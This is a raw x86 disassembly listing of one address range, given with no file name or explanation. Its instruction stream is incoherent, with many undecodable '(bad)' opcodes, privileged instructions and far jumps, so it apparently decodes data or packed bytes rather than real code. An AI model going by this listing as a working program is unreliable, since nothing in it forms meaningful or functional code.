  427574:	cmp    DWORD PTR ds:0x752a47ce,0xfffffff7
  42757b:	inc    esi
  42757c:	aas    
  42757d:	mov    ch,0xf0
  42757f:	(bad)  
  427580:	imul   ebx,DWORD PTR [esp+ebx*4-0x77],0x26abf801
  427588:	call   0xb78de496
  42758d:	mov    bh,0xbe
  42758f:	daa    
  427590:	or     bh,0xc0
  427593:	jmp    0xf5b6:0x7b58e5d9
  42759a:	jecxz  0x4275be
  42759c:	dec    edx
  42759d:	mov    ds:0xb937d218,al
  4275a2:	clc    
  4275a3:	xor    dh,ch
  4275a5:	push   cs
  4275a6:	sub    eax,0x92080adf
  4275ab:	daa    
  4275ac:	and    al,BYTE PTR [edi]
  4275ae:	les    ebx,FWORD PTR [eax]
  4275b0:	into   
  4275b1:	aam    0x5c
  4275b3:	push   cs
  4275b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275b5:	fbstp  TBYTE PTR [bp+0x7f42]
  4275ba:	icebp  
  4275bb:	jno    0x4275f7
  4275bd:	fisttp DWORD PTR [ebx-0x3976ae32]
  4275c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275c4:	mov    dh,0x53
  4275c6:	adc    bh,ch
  4275c8:	jo     0x4275e1
  4275ca:	repz add DWORD PTR [ecx+0x28],edx
  4275ce:	sbb    BYTE PTR ds:0x8a5d85ea,dh
  4275d4:	iret   
  4275d5:	loope  0x427562
  4275d7:	inc    esi
  4275d8:	dec    edx
  4275d9:	scas   eax,DWORD PTR es:[edi]
  4275da:	mov    bh,0xcf
  4275dc:	aad    0x96
  4275de:	in     al,0x72
  4275e0:	stos   BYTE PTR es:[edi],al
  4275e1:	jns    0x4275d4
  4275e3:	xchg   esp,eax
  4275e4:	fstp   st(1)
  4275e6:	xlat   BYTE PTR ds:[ebx]
  4275e7:	sahf   
  4275e8:	pushf  
  4275e9:	fild   DWORD PTR [edi-0x2e]
  4275ec:	push   cs
  4275ed:	xchg   esi,eax
  4275ee:	push   ebx
  4275ef:	test   eax,0xbe1fb0d7
  4275f4:	ficom  DWORD PTR [edi+ecx*4]
  4275f7:	add    eax,0x3e94e245
  4275fc:	iret   
  4275fd:	xchg   ecx,eax
  4275fe:	aam    0xaf
  427600:	mov    edi,0xf42b489a
  427605:	sbb    al,0xce
  427607:	pop    esi
  427608:	sub    al,0xdd
  42760a:	inc    esi
  42760b:	add    esi,0xffffffcb
  42760e:	mov    ah,0xf1
  427610:	jno    0x4275b2
  427612:	das    
  427613:	aaa    
  427614:	or     ecx,ebx
  427616:	pop    ebp
  427617:	cwde   
  427618:	retf   0xf0a7
  42761b:	ins    BYTE PTR es:[edi],dx
  42761c:	mov    cl,0xba
  42761e:	fcmovu st,st(7)
  427620:	mov    ebp,DWORD PTR [ebx]
  427622:	mov    DWORD PTR [edx-0x1ff47b40],ebx
  427628:	pop    es
  427629:	cli    
  42762a:	loopne 0x4275e8
  42762c:	sti    
  42762d:	int3   
  42762e:	jecxz  0x4275f7
  427630:	xor    DWORD PTR [ebx],edi
  427632:	stc    
  427633:	pop    ebx
  427634:	loope  0x4276a6
  427636:	pusha  
  427637:	dec    ebx
  427638:	repz mov edi,ebp
  42763b:	(bad)  
  42763c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42763d:	xchg   ecx,eax
  42763e:	xchg   esi,eax
  42763f:	mov    dl,0x66
  427641:	mov    dh,0x5b
  427643:	repnz mov ds:0xdc192022,al
  427649:	or     bh,BYTE PTR [esi+eiz*8]
  42764c:	xchg   edi,eax
  42764d:	stos   BYTE PTR es:[edi],al
  42764e:	out    dx,al
  42764f:	xchg   esi,eax
  427650:	cmc    
  427651:	cwde   
  427652:	push   0x77
  427654:	xchg   BYTE PTR [edx],ch
  427656:	mov    edi,es
  427658:	jmp    0xe6ee:0x62997af6
  42765f:	xchg   DWORD PTR [ecx-0x6b],esp
  427662:	add    al,0xef
  427664:	(bad)  
  427665:	sbb    al,0xb9
  427667:	pop    edi
  427668:	fiadd  WORD PTR [eax+0x2ee5b85e]
  42766e:	inc    esp
  42766f:	popf   
  427670:	push   esp
  427671:	pusha  
  427672:	sbb    ebp,DWORD PTR [eax-0x6627accc]
  427678:	or     esi,esp
  42767a:	loop   0x4276b9
  42767c:	inc    ecx
  42767d:	adc    BYTE PTR [ebp-0x40],dh
  427680:	or     BYTE PTR [edi+edx*4],bh
  427683:	iret   
  427684:	cmp    esi,DWORD PTR [edx-0x65]
  427687:	or     eax,0x45311604
  42768c:	dec    ecx
  42768d:	cmc    
  42768e:	mov    bl,0x48
  427690:	dec    esp
  427691:	(bad)  
  427692:	jne    0x427616
  427694:	push   esp
  427695:	mov    edx,0x60239cf7
  42769a:	dec    eax
  42769b:	dec    edx
  42769c:	mov    al,BYTE PTR [ebp+ebx*4+0x1914ec4]
  4276a3:	cld    
  4276a4:	inc    ecx
  4276a5:	(bad)  
  4276a6:	icebp  
  4276a7:	sub    DWORD PTR [ebx-0x49],0x31
  4276ab:	mov    bh,0x89
  4276ad:	add    ecx,DWORD PTR [edx+0x42]
  4276b0:	xor    dh,BYTE PTR [esi+0x6a485b6e]
  4276b6:	mov    ds:0xfda73ae6,eax
  4276bb:	js     0x427723
  4276bd:	loope  0x4276bf
  4276bf:	add    BYTE PTR [eax],al
  4276c1:	add    BYTE PTR [edx],cl
  4276c3:	les    esp,FWORD PTR [ecx+0x5ef7eff7]
  4276c9:	std    
  4276ca:	mov    ebp,0x90f91c3b
  4276cf:	cli    
  4276d0:	cmp    ecx,DWORD PTR [eax-0x33]
  4276d3:	out    dx,al
  4276d4:	add    DWORD PTR [eax],eax
  4276d6:	hlt    
  4276d7:	add    al,0x0
  4276d9:	add    BYTE PTR [ebx+0x48],bl
  4276dc:	mov    fs,esi
  4276de:	inc    ebp
  4276df:	enter  0x6fa1,0x2
  4276e3:	or     al,0x94
  4276e5:	(bad)  
  4276e6:	xor    ch,BYTE PTR [edi+0x48]
  4276e9:	imul   esp,DWORD PTR [ebp-0x63],0xffffff90
  4276ed:	data16 sbb BYTE PTR [esi+ecx*2],al
  4276f1:	daa    
  4276f2:	inc    edx
  4276f3:	xor    eax,0xfb30f209
  4276f8:	sahf   
  4276f9:	add    al,0x2c
  4276fb:	jmp    0xd2e488a9
  427700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427701:	(bad)  [esi]
  427703:	mov    ecx,0x1ce982b0
  427708:	rol    BYTE PTR [eax+0x1d4cc362],cl
  42770e:	jg     0x42774b
  427710:	test   al,0xe7
  427712:	sub    al,0xf5
  427714:	xchg   ebp,eax
  427715:	out    0x58,al
  427717:	pop    eax
  427718:	ret    
  427719:	jecxz  0x427723
  42771b:	pop    esi
  42771c:	ret    
  42771d:	add    al,0xd
  42771f:	test   al,0x6b
  427721:	inc    eax
  427722:	jo     0x4276d5
  427724:	push   edi
  427725:	adc    eax,0xa0db3b34
  42772a:	xor    edx,DWORD PTR [eax-0x48e79475]
  427730:	(bad)  [ebx+0x24]
  427733:	in     al,dx
  427734:	mov    esp,0x1fdb3586
  427739:	push   DWORD PTR [ecx]
  42773b:	add    DWORD PTR [eax-0x52],edi
  42773e:	iret   
  42773f:	call   0x618ae22d
  427744:	push   esp
  427745:	adc    al,0x51
  427747:	and    al,0x92
  427749:	ficomp WORD PTR [ebx-0x5]
  42774c:	xchg   DWORD PTR [edi+0x52],edi
  42774f:	lods   eax,DWORD PTR ds:[esi]
  427750:	and    DWORD PTR [ecx],edi
  427752:	pusha  
  427753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427754:	cli    
  427755:	adc    BYTE PTR [eax*8-0xfaec9e2],ch
  42775c:	aam    0xf1
  42775e:	std    
  42775f:	iret   
  427760:	jo     0x427783
  427762:	add    edx,DWORD PTR [edi-0x25]
  427765:	pushf  
  427766:	aam    0x82
  427768:	mov    BYTE PTR [ecx+0xb],al
  42776b:	stos   DWORD PTR es:[edi],eax
  42776c:	cmp    dl,BYTE PTR [ecx-0x303ba567]
  427772:	cmp    al,0x59
  427774:	or     ah,BYTE PTR [eax]
  427776:	jge    0x42771d
  427778:	ss cld 
  42777a:	jle    0x42770a
  42777c:	pop    ebp
  42777d:	xchg   ebp,eax
  42777e:	xor    BYTE PTR ds:0x6e9229e6,bl
  427784:	ja     0x42775c
  427786:	mov    al,0xbe
  427788:	inc    edx
  427789:	sbb    dh,BYTE PTR [eax+0x1845bda7]
  42778f:	repz int3 
  427791:	cmc    
  427792:	hlt    
  427793:	push   eax
  427794:	sbb    BYTE PTR [eax-0x3f],bh
  427797:	push   edx
  427798:	fild   QWORD PTR [edi+0x1c]
  42779b:	fiadd  WORD PTR [ebx-0x43a2d269]
  4277a1:	xor    al,BYTE PTR ds:0xaf4c9cce
  4277a7:	cdq    
  4277a8:	fistp  QWORD PTR [esi]
  4277aa:	jge    0x427785
  4277ac:	or     BYTE PTR [edx],ch
  4277ae:	(bad)
  4277b2:	xchg   DWORD PTR [ecx+0x642ed74e],esi
  4277b8:	mov    edi,0xeac5e44c
  4277bd:	stos   BYTE PTR es:[edi],al
  4277be:	mov    ch,0x69
  4277c0:	test   BYTE PTR [ecx+0x13e19a35],cl
  4277c6:	pop    ss
  4277c7:	mov    WORD PTR [edi+edx*8-0x38],es
  4277cb:	loope  0x42779b
  4277cd:	xchg   ebp,eax
  4277ce:	adc    al,0xe4
  4277d0:	imul   esi,esi,0xb350ebe1
  4277d6:	shr    bh,cl
  4277d8:	or     eax,0x8f618601
  4277dd:	xchg   BYTE PTR [edx+0x22850ed2],ah
  4277e3:	mov    ebp,0x379db29f
  4277e8:	hlt    
  4277e9:	bound  edx,QWORD PTR [ebp-0x69]
  4277ec:	cmp    al,0xf2
  4277ee:	adc    DWORD PTR [ebp+0x4e],edi
  4277f1:	cmp    al,0xec
  4277f3:	mov    eax,ds:0x198e137
  4277f8:	or     eax,0xd1319bc8
  4277fd:	adc    bl,cl
  4277ff:	mov    bh,0xc5
  427801:	(bad)  [edx+eax*1]
  427804:	pop    ecx
  427805:	mov    bh,0x23
  427807:	addr16 ret 
  427809:	adc    eax,0xd660d9be
  42780e:	cmp    BYTE PTR [esi],bl
  427810:	popf   
  427811:	fisubr WORD PTR [edx]
  427813:	aam    0x51
  427815:	pop    eax
  427816:	retf   0x9f41
  427819:	add    edx,DWORD PTR [ecx]
  42781b:	inc    ecx
  42781c:	int3   
  42781d:	jae    0x4277c3
  42781f:	(bad)  [esi]
  427821:	aad    0xb4
  427823:	lahf   
  427824:	popa   
  427825:	and    bh,BYTE PTR [edi]
  427827:	je     0x42789c
  427829:	cmp    eax,0x3f164cd3
  42782e:	outs   dx,BYTE PTR ds:[esi]
  42782f:	jecxz  0x42782a
  427831:	(bad)  
  427832:	iret   
  427833:	dec    ecx
  427834:	xor    ebx,DWORD PTR ds:0xc4cce89b
  42783a:	or     cl,BYTE PTR [edi-0x17]
  42783d:	jb     0x4277d5
  42783f:	push   esi
  427840:	sbb    al,0xff
  427842:	stc    
  427843:	dec    ebp
  427844:	add    eax,0x16b9c7e9
  427849:	cld    
  42784a:	cdq    
  42784b:	cmp    BYTE PTR [edx+0x69],ch
  42784e:	mov    ah,0x23
  427850:	xlat   BYTE PTR ds:[ebx]
  427851:	mov    ebp,0xd454a1d7
  427856:	pop    ebp
  427857:	cmp    ah,BYTE PTR [ebp+0x62]
  42785a:	scas   al,BYTE PTR es:[edi]
  42785b:	inc    esp
  42785c:	sbb    eax,esp
  42785e:	retf   
  42785f:	lds    esp,FWORD PTR [esi-0x6333f523]
  427865:	or     edi,ebp
  427867:	mov    al,0x19
  427869:	or     esp,esp
  42786b:	mov    eax,ds:0x18c473a6
  427870:	ds int 0xa8
  427873:	xor    eax,0xb3915d67
  427878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427879:	std    
  42787a:	mov    ebx,0x218ba190
  42787f:	sar    DWORD PTR [edx],cl
  427881:	mov    esi,0xb9c49f13
  427886:	out    dx,eax
  427887:	push   0xfdab0aba
  42788c:	mov    ebp,0x8a0ed192
  427891:	arpl   WORD PTR [esi],bx
  427893:	loop   0x427875
  427895:	push   edi
  427896:	inc    edi
  427897:	retf   0xc755
  42789a:	and    al,0xd5
  42789c:	out    0x64,eax
  42789e:	mov    ah,0x67
  4278a0:	mul    DWORD PTR [ecx+eiz*4+0x1cf821be]
  4278a7:	out    0xc8,al
  4278a9:	js     0x4278f2
  4278ab:	or     bl,BYTE PTR [esp+edi*4-0x4f]
  4278af:	inc    ebp
  4278b0:	inc    ecx
  4278b1:	or     DWORD PTR [ebx+0x53e62619],0xcb2367c5
  4278bb:	inc    esi
  4278bc:	les    ebx,FWORD PTR [esi-0x1ade8479]
  4278c2:	or     al,0x39
  4278c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278c5:	fsub   DWORD PTR [esi+edx*2+0x71]
  4278c9:	and    ebx,DWORD PTR [edi]
  4278cb:	rcl    BYTE PTR [ebp-0x6],0xe9
  4278cf:	mov    al,ds:0x8e347715
  4278d4:	ja     0x42787b
  4278d6:	int3   
  4278d7:	repz pop eax
  4278d9:	mov    bl,BYTE PTR [edi+edx*4]
  4278dc:	jge    0x427930
  4278de:	jg     0x427959
  4278e0:	std    
  4278e1:	jae    0x42794a
  4278e3:	mov    esi,0x37e1d380
  4278e8:	sahf   
  4278e9:	lahf   
  4278ea:	xchg   esi,eax
  4278eb:	adc    DWORD PTR [edx],edx
  4278ed:	(bad)  
  4278ee:	jg     0x427893
  4278f0:	pusha  
  4278f1:	stc    
  4278f2:	cwde   
  4278f3:	cmp    esp,DWORD PTR [edi]
  4278f5:	sahf   
  4278f6:	pop    ecx
  4278f7:	(bad)  
  4278f9:	add    eax,0x72f50d1b
  4278fe:	jp     0x42790e
  427900:	ss xchg esi,eax
  427902:	mov    bh,0xed
  427904:	(bad)  
  427905:	jno    0x4278f9
  427907:	xchg   esp,eax
  427908:	or     bl,bh
  42790a:	add    ebx,DWORD PTR [eax]
  42790c:	scas   eax,DWORD PTR es:[edi]
  42790d:	mov    ch,0xa7
  42790f:	cmp    esi,DWORD PTR [esi-0x6051fcb7]
  427915:	ret    0xdc23
  427918:	and    eax,esp
  42791a:	push   ecx
  42791b:	call   0x5f3a6079
  427920:	mov    ch,0xc2
  427922:	push   ebp
  427923:	add    ebx,DWORD PTR [ecx]
  427925:	das    
  427926:	dec    edi
  427927:	std    
  427928:	ror    DWORD PTR [ebx-0x7b78d76d],cl
  42792e:	push   esp
  42792f:	ins    DWORD PTR es:[edi],dx
  427930:	dec    eax
  427931:	nop
  427932:	sbb    BYTE PTR [ecx],bl
  427934:	in     al,0x8d
  427936:	jl     0x427919
  427938:	lahf   
  427939:	inc    ecx
  42793a:	xlat   BYTE PTR ds:[ebx]
  42793b:	in     eax,dx
  42793c:	jl     0x42796c
  42793e:	pop    edx
  42793f:	sub    eax,0x32749986
  427944:	push   ecx
  427945:	dec    edi
  427946:	inc    esp
  427947:	push   es
  427948:	sbb    BYTE PTR [edx+0x1e072ab9],cl
  42794e:	mov    al,0xb5
  427950:	mov    BYTE PTR [esp+ebx*2+0x3e],cl
  427954:	call   0x92c:0x441d28fe
  42795b:	cli    
  42795c:	in     eax,dx
  42795d:	cmp    esi,DWORD PTR [esi]
  42795f:	mov    al,0x6f
  427961:	jno    0x4279ae
  427963:	jbe    0x4279ca
  427965:	inc    esi
  427966:	adc    DWORD PTR [ebp+0x5270aa2f],edi
  42796c:	jnp    0x427935
  42796e:	into   
  42796f:	xchg   edx,eax
  427970:	(bad)  
  427971:	lods   al,BYTE PTR ds:[esi]
  427972:	mov    dl,0x41
  427974:	or     bl,BYTE PTR [ebx]
  427976:	aam    0x6f
  427978:	and    ebp,eax
  42797a:	jo     0x42798b
  42797c:	repz pop ds
  42797e:	dec    ebx
  42797f:	lock idiv BYTE PTR [eax+ebx*8+0x55cde714]
  427987:	ss ss dec esi
  42798a:	and    edi,edx
  42798c:	call   ebx
  42798e:	cdq    
  42798f:	nop
  427990:	mul    ebp
  427992:	mov    ah,0x8e
  427994:	mov    esi,esp
  427996:	sub    eax,0xaa0fdf8d
  42799b:	xchg   edx,eax
  42799c:	pop    ecx
  42799d:	mov    bl,0x7f
  42799f:	das    
  4279a0:	mov    edx,0x5bf7307f
  4279a5:	sub    dh,ah
  4279a7:	xor    dh,BYTE PTR [edx+0x194837ab]
  4279ad:	icebp  
  4279ae:	pop    ds
  4279af:	imul   ebp,DWORD PTR [edi-0x7967fb09],0xffffff8f
  4279b6:	mov    esp,0xd7822b23
  4279bb:	call   0xd397:0x3393f741
  4279c2:	dec    eax
  4279c3:	mov    DWORD PTR [ebp-0x11ca6156],ebx
  4279c9:	push   DWORD PTR [ebx-0xac7ee22]
  4279cf:	push   ecx
  4279d0:	adc    DWORD PTR [ebx-0x6c908215],edx
  4279d6:	cs mov eax,0x81e6fc4a
  4279dc:	jnp    0x4279ee
  4279de:	scas   eax,DWORD PTR es:[edi]
  4279df:	test   BYTE PTR [ecx],bl
  4279e1:	mov    ebx,DWORD PTR [ebx-0x15]
  4279e4:	add    DWORD PTR ds:0x93df088b,0x6f
  4279eb:	stos   BYTE PTR es:[edi],al
  4279ec:	aas    
  4279ed:	fwait
  4279ee:	mov    BYTE PTR [esi+esi*2-0x1b],bl
  4279f2:	or     eax,0x521945b5
  4279f7:	loopne 0x427a30
  4279f9:	inc    esi
  4279fa:	sub    DWORD PTR [edi-0x2a76b964],0xef6e4357
  427a04:	ror    BYTE PTR [edi],0xa1
  427a07:	push   cs
  427a08:	add    edi,DWORD PTR [ebx-0x2a]
  427a0b:	scas   eax,DWORD PTR es:[edi]
  427a0c:	and    sp,WORD PTR [edx+0x68]
  427a10:	test   eax,0xa614ff25
  427a15:	adc    eax,0xa8d92d99
  427a1a:	or     esi,DWORD PTR [eax]
  427a1c:	sbb    al,0xb8
  427a1e:	inc    eax
  427a1f:	inc    esi
  427a20:	fnstcw WORD PTR [ebx-0x6190fe6f]
  427a26:	shl    DWORD PTR ds:0xc619d4e5,1
  427a2c:	add    eax,0x2068a53d
  427a31:	ss jmp 0x97c:0xcac75fef
  427a39:	arpl   si,bp
  427a3b:	adc    ebp,0x85d59030
  427a41:	mov    ebp,0x8dc8e118
  427a46:	(bad)  
  427a47:	ins    DWORD PTR es:[edi],dx
  427a48:	ins    BYTE PTR es:[edi],dx
  427a49:	jle    0x427a04
  427a4b:	stos   DWORD PTR es:[edi],eax
  427a4c:	and    al,0xd4
  427a4e:	jae    0x427a35
  427a50:	(bad)  
  427a51:	loope  0x427a63
  427a53:	sahf   
  427a54:	pop    ebp
  427a55:	ja     0x427aa7
  427a57:	and    ch,BYTE PTR [ebx+0x6adbed52]
  427a5d:	xchg   ebx,eax
  427a5e:	call   0x703d:0x1c1c6e1c
  427a65:	addr16 mov dl,0xb
  427a68:	popf   
  427a69:	shr    al,1
  427a6b:	bound  esi,QWORD PTR [ebp+0x8f62dd0]
  427a71:	sbb    esp,DWORD PTR [ecx+0x7d]
  427a74:	nop
  427a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a76:	pop    es
  427a77:	out    dx,eax
  427a78:	jecxz  0x427a19
  427a7a:	pop    ebx
  427a7b:	leave  
  427a7c:	popf   
  427a7d:	mov    cs,edx
  427a7f:	jecxz  0x427a5b
  427a81:	jg     0x427a7e
  427a83:	bound  edx,QWORD PTR gs:[edi-0x71]
  427a87:	lds    esi,FWORD PTR [ebp+0x365d7c3a]
  427a8d:	pop    ds
  427a8e:	(bad)  
  427a8f:	sbb    edx,ebp
  427a91:	test   eax,0x20d93bb2
  427a96:	(bad)  [ebp-0x54c6485c]
  427a9c:	es jno 0x427ab3
  427a9f:	or     ebp,0x5995fd1c
  427aa5:	aad    0x92
  427aa7:	arpl   WORD PTR [edx-0xd],di
  427aaa:	sysexit 
  427aac:	inc    edi
  427aad:	sub    edx,DWORD PTR [ebx+0x7d]
  427ab0:	in     eax,0xbb
  427ab2:	xchg   edx,eax
  427ab3:	stc    
  427ab4:	dec    edi
  427ab5:	and    DWORD PTR [ebx+0x7e9808ad],ebp
  427abb:	imul   edx,DWORD PTR [edi+0xa],0x90fb138f
  427ac2:	cld    
  427ac3:	(bad)  
  427ac4:	mov    ah,BYTE PTR [ebx+edx*2]
  427ac7:	inc    eax
  427ac8:	aaa    
  427ac9:	pop    ebp
  427aca:	and    bh,dl
  427acc:	or     al,0xef
  427ace:	fcom   DWORD PTR [edi+edx*2-0x13304474]
  427ad5:	fstp   DWORD PTR [ebp+0x61d8f7b]
  427adb:	push   cs
  427adc:	add    ebp,DWORD PTR ds:0x9b4c41bd
  427ae2:	mov    bl,BYTE PTR [esi+0xe]
  427ae5:	js     0x427a94
  427ae7:	mov    ebx,0x6b11f2ea
  427aec:	shl    DWORD PTR [edi],0x9e
  427aef:	aaa    
  427af0:	mov    al,ds:0x3767940d
  427af5:	fwait
  427af6:	cmovnp edi,DWORD PTR [eax]
  427af9:	test   ch,cl
  427afb:	mov    ds:0x64044d6d,eax
  427b00:	or     ebx,ecx
  427b02:	sub    DWORD PTR [ecx+0xe],0x3d978d58
  427b09:	inc    edi
  427b0a:	pop    ds
  427b0b:	push   eax
  427b0c:	or     al,0xfe
  427b0e:	push   0x2c25b9ea
  427b13:	fldcw  WORD PTR [ebp+0x38]
  427b16:	enter  0x82b5,0x13
  427b1a:	adc    bl,BYTE PTR [ebp+edi*1+0x3e07deb9]
  427b21:	mov    ah,0x4c
  427b23:	xchg   ebp,eax
  427b24:	add    eax,0x4ad6dc0f
  427b29:	and    DWORD PTR [esi+edx*4],edx
  427b2c:	imul   esi,DWORD PTR [ebp-0x80],0x1911e0fb
  427b33:	lds    esp,FWORD PTR [ecx+0x43]
  427b36:	push   esp
  427b37:	mov    ebp,0x45dd203a
  427b3c:	jmp    0x4dad:0x50c7e861
  427b43:	leave  
  427b44:	sbb    esi,DWORD PTR [esi+ecx*1-0x5da5a0d0]
  427b4b:	jecxz  0x427b0b
  427b4d:	xor    al,0x78
  427b4f:	fnstsw WORD PTR [esi+0x2f]
  427b52:	scas   al,BYTE PTR es:[edi]
  427b53:	stos   BYTE PTR es:[edi],al
  427b54:	jp     0x427b12
  427b56:	xchg   ebx,eax
  427b57:	mov    ch,0xa6
  427b59:	inc    esp
  427b5a:	cmp    BYTE PTR [eax+0x75],bl
  427b5d:	jb     0x427b07
  427b5f:	scas   eax,DWORD PTR es:[edi]
  427b60:	xor    bl,BYTE PTR [ecx]
  427b62:	add    al,bh
  427b64:	imul   edx,DWORD PTR [edi-0x7195f9a1],0xfdbf3476
  427b6e:	jno    0x427beb
  427b70:	push   es
  427b71:	mov    bl,0x8c
  427b73:	movd   edi,mm1
  427b76:	jecxz  0x427b3d
  427b78:	mov    ecx,DWORD PTR [edx]
  427b7a:	inc    esp
  427b7b:	pop    ecx
  427b7c:	adc    al,0x14
  427b7f:	jp     0x427b30
  427b81:	aam    0x3
  427b83:	scas   al,BYTE PTR es:[edi]
  427b84:	aaa    
  427b85:	push   ecx
  427b86:	jo     0x427b28
  427b88:	add    BYTE PTR [ebp-0x37b5cff8],0x6d
  427b8f:	jae    0x427bde
  427b91:	sar    DWORD PTR [edi],cl
  427b93:	and    al,0x1d
  427b95:	push   edx
  427b96:	adc    al,0x75
  427b98:	out    0xbd,al
  427b9a:	lock pop edi
  427b9c:	scas   eax,DWORD PTR es:[edi]
  427b9d:	xor    ah,BYTE PTR [ebx-0x54c805f2]
  427ba3:	retf   0x5802
  427ba6:	popa   
  427ba7:	pcmpeqw mm5,QWORD PTR [ecx-0x79]
  427bab:	pop    ebx
  427bac:	cld    
  427bad:	adc    edx,DWORD PTR [ecx-0x34]
  427bb0:	mov    ecx,0xc44881c0
  427bb5:	stos   DWORD PTR es:[edi],eax
  427bb6:	mov    dl,0xd
  427bb8:	or     eax,0xe6a421ee
  427bbd:	inc    eax
  427bbe:	fs cli 
  427bc0:	test   al,0xec
  427bc2:	xlat   BYTE PTR ds:[ebx]
  427bc3:	std    
  427bc4:	sbb    ch,BYTE PTR [edx+eax*2]
  427bc7:	xor    bh,ah
  427bc9:	sub    BYTE PTR [eax+0x29],ah
  427bcc:	arpl   WORD PTR [edx+0x0],di
  427bd2:	ja     0x427bca
  427bd4:	push   ecx
  427bd5:	dec    edi
  427bd6:	shr    edi,1
  427bd8:	jg     0x427bd8
  427bda:	push   cs
  427bdb:	mov    edi,0x6ac6e2d0
  427be0:	je     0x427bbc
  427be2:	shl    ebx,0x1
  427be5:	add    ah,dh
  427be7:	add    al,0x0
  427be9:	add    bl,bh
  427beb:	jl     0x427c67
  427bed:	mov    eax,ds:0xabd86775
  427bf2:	mov    cl,0x76
  427bf4:	mov    ebx,0xa50e7d9
  427bf9:	jp     0x427bc9
  427bfb:	add    ah,BYTE PTR [edx+0x73]
  427bfe:	cmp    al,0x4f
  427c00:	and    DWORD PTR [esi],0xdc98374c
  427c06:	cld    
  427c07:	cmp    bl,0xbb
  427c0a:	les    eax,FWORD PTR [bp+si]
  427c0d:	mov    ch,0xe0
  427c0f:	adc    BYTE PTR [eax],cl
  427c11:	and    dh,BYTE PTR [ecx-0x5996d30c]
  427c17:	sahf   
  427c18:	aaa    
  427c19:	pusha  
  427c1a:	not    DWORD PTR [ebp*2+0x1aef3dde]
  427c21:	std    
  427c22:	pop    edx
  427c23:	ffreep st(4)
  427c25:	popf   
  427c26:	les    edi,FWORD PTR [edx+0x7b]
  427c29:	cmc    
  427c2a:	scas   al,BYTE PTR es:[edi]
  427c2b:	shl    DWORD PTR [edx-0x1e88a64a],cl
  427c31:	sbb    ecx,ebp
  427c33:	lahf   
  427c34:	ins    BYTE PTR es:[edi],dx
  427c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c36:	sbb    dh,BYTE PTR [edx+eiz*2-0x12]
  427c3a:	push   eax
  427c3b:	mov    dl,0xb2
  427c3d:	mov    cl,0xf0
  427c3f:	xor    BYTE PTR ds:0x969a40f6,bl
  427c45:	push   esi
  427c46:	enter  0x31df,0xee
  427c4a:	jmp    0xfabd6a65
  427c4f:	pop    eax
  427c50:	ins    BYTE PTR es:[edi],dx
  427c51:	push   ss
  427c52:	shld   esp,edx,0x8
  427c56:	push   edx
  427c57:	test   eax,0xf111db25
  427c5c:	sbb    al,0xfc
  427c5e:	test   eax,0x34b5b74
  427c63:	stc    
  427c64:	sub    bh,BYTE PTR [edx-0x4e283b51]
  427c6a:	mov    ah,0x9e
  427c6c:	dec    edx
  427c6d:	in     eax,dx
  427c6e:	sbb    DWORD PTR [edi],edx
  427c70:	or     DWORD PTR [edi],esp
  427c72:	xchg   esp,eax
  427c73:	fwait
  427c74:	es (bad) 
  427c76:	neg    DWORD PTR [esi-0x6e]
  427c79:	jle    0x427c3a
  427c7b:	pop    es
  427c7c:	enter  0x1136,0x3d
  427c80:	fistp  QWORD PTR [ecx+ebx*8]
  427c83:	pop    esi
  427c84:	pushf  
  427c85:	ds pop es
  427c87:	fcomi  st,st(1)
  427c89:	arpl   WORD PTR [ebp+0x6f],di
  427c8c:	mov    esi,0x5d7c08f9
  427c91:	retf   
  427c92:	adc    DWORD PTR [edi+0x79],0xb
  427c96:	lea    ebx,[ebp-0x2cfd58f1]
  427c9c:	dec    ebx
  427c9d:	cmc    
  427c9e:	fidiv  WORD PTR [eax]
  427ca0:	lds    ecx,FWORD PTR [ebx+ebx*4]
  427ca3:	mov    ah,0xe6
  427ca5:	sub    DWORD PTR [eax+0x1b],0x615ac059
  427cac:	js     0x427cac
  427cae:	cmc    
  427caf:	cmp    eax,0xdaaf69f4
  427cb4:	xor    eax,eax
  427cb6:	xchg   ebx,eax
  427cb7:	ins    BYTE PTR es:[edi],dx
  427cb8:	add    al,BYTE PTR [ebx+0x470d1630]
  427cbe:	pusha  
  427cbf:	push   eax
  427cc0:	cld    
  427cc1:	cmp    BYTE PTR [ebx+0x71cd1007],0xfd
  427cc8:	ror    BYTE PTR [ebx+0xeb26603],0x54
  427ccf:	je     0x427d50
  427cd1:	mov    edi,0xf0611ba8
  427cd6:	rcl    BYTE PTR [eax+0x3517fd1e],1
  427cdc:	sti    
  427cdd:	(bad)  
  427cde:	pop    esp
  427cdf:	retf   0xab4a
  427ce2:	xor    edi,edx
  427ce4:	sub    eax,DWORD PTR [ecx+0x37b83109]
  427cea:	add    eax,DWORD PTR [ebx+0x6]
  427ced:	mov    ds:0x4e99aa44,eax
  427cf2:	lea    ebx,[edi+ecx*4-0x57]
  427cf6:	(bad)  
  427cf7:	cli    
  427cf8:	fistp  QWORD PTR [eax+ebx*1+0x6d]
  427cfc:	mov    ebp,0x99d70619
  427d01:	pop    ecx
  427d02:	add    bh,cl
  427d04:	fs xchg ebp,eax
  427d06:	jge    0x427d1a
  427d08:	call   DWORD PTR [edx+0x4842a7ca]
  427d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d0f:	add    al,0x2f
  427d11:	gs pop ds
  427d13:	jmp    0xb036:0x6fc34cac
  427d1a:	push   eax
  427d1b:	js     0x427d73
  427d1d:	or     ch,dl
  427d1f:	cmp    al,0x2b
  427d21:	(bad)  
  427d22:	sub    al,0x87
  427d24:	mov    cl,0xc0
  427d26:	mov    ds:0xe2a9b6eb,eax
  427d2b:	xor    eax,0xa83214c
  427d30:	test   BYTE PTR [eax+0xd47e366],bh
  427d36:	and    dl,BYTE PTR [eax]
  427d38:	imul   edx,DWORD PTR [edx],0xffffffe3
  427d3b:	or     eax,0x6b91de76
  427d40:	fs mov esp,0x382f2815
  427d46:	dec    ebp
  427d47:	jb     0x427ce1
  427d49:	cdq    
  427d4a:	in     eax,0x1e
  427d4c:	mov    cs,WORD PTR [edx]
